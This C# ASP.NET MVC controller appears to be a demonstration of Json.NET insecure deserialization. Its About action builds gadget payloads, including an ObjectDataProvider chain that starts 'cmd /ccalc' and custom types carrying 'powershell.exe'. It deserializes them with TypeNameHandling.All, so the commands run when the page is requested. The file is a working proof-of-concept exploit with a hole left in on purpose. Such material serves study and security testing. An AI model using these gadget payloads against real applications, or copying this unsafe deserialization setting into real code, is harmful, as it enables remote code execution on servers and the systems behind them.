using System.Web.Mvc;
using mvcapp.Models;
using Newtonsoft.Json;

namespace mvcapp.Controllers
{
    public class HomeController : Controller
    {
        public ActionResult Index()
        {
            return View();
        }

        public ActionResult About()
        {
            ViewBag.Message = "Your application description page.";

            var simple = new Simple
            {
                ID = 1,
                Value = "Some test string."
            };

            var simple2 = new Simple
            {
                ID = 2,
                Value = "Some test string 2."
            };

            //var complex = new ComplexConstructor("powershell.exe")
            //{
            //    ID = 3,
            //};

            simple.Value = simple2;

            var serializedSimple = JsonConvert.SerializeObject(simple, new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All});

            //var serializedComplex = JsonConvert.SerializeObject(complex, new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All });

            //{"$type":"mvcapp.Models.Simple, mvcapp","ID":1,"Value":"Some test string."}
            //{"$type":"mvcapp.Models.Simple, mvcapp","ID":1,"Value":{"$type":"mvcapp.Models.Simple, mvcapp","ID":2,"Value":"Some test string 2."}}
            //{"$type":"mvcapp.Models.ComplexConstructor, mvcapp","ID":3,"Parameters":"powershell.exe"}

            string payloadWithComplexConstructor = "{\"$type\":\"mvcapp.Models.Simple, mvcapp\",\"ID\":1,\"Value\":{\"$type\":\"mvcapp.Models.ComplexConstructor, mvcapp\",\"ID\":2,\"Parameters\":\"powershell.exe\"}}";
            string payloadWithComplexSetter = "{\"$type\":\"mvcapp.Models.Simple, mvcapp\",\"ID\":1,\"Value\":{\"$type\":\"mvcapp.Models.ComplexSetter, mvcapp\",\"ID\":2,\"Parameters\":\"powershell.exe\"}}";

            string objectDataProviderPayload = @"{
                '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
                'MethodName':'Start',
                'MethodParameters':{
                    '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                    '$values':['cmd','/ccalc']
                },
                'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
            }";

            string payloadWithObjectDataProviderPayload ="{\"$type\":\"mvcapp.Models.Simple, mvcapp\",\"ID\":1,\"Value\":"+ objectDataProviderPayload +"}";


            var deserializeSimpleObject = JsonConvert.DeserializeObject(serializedSimple);

            var deserializeSimpleObjectWithTypeNameHandlingAll = JsonConvert.DeserializeObject(serializedSimple, new
                JsonSerializerSettings
                {
                    TypeNameHandling = TypeNameHandling.All
                });

            var deserializePayloadWithObjectDataProviderPayload = JsonConvert.DeserializeObject(payloadWithObjectDataProviderPayload, new
                JsonSerializerSettings
                {
                    TypeNameHandling = TypeNameHandling.All
                });

            var deserializeComplexConstructorObjectWithTypeNameHandlingAll = JsonConvert.DeserializeObject(payloadWithComplexConstructor, new
                JsonSerializerSettings
                {
                    TypeNameHandling = TypeNameHandling.All
                });

            var deserializeComplexSetterObjectWithTypeNameHandlingAll = JsonConvert.DeserializeObject(payloadWithComplexSetter, new
                JsonSerializerSettings
                {
                    TypeNameHandling = TypeNameHandling.All
                });

            var deserializeSimple = JsonConvert.DeserializeObject<Simple>(serializedSimple);

            var deserializeSimpleWithTypeNameHandlingAll = JsonConvert.DeserializeObject<Simple>(serializedSimple, new
                JsonSerializerSettings
                {
                    TypeNameHandling = TypeNameHandling.All
                });

            return View();
        }

        public ActionResult Contact()
        {
            ViewBag.Message = "Your contact page.";

            return View();
        }
    }
}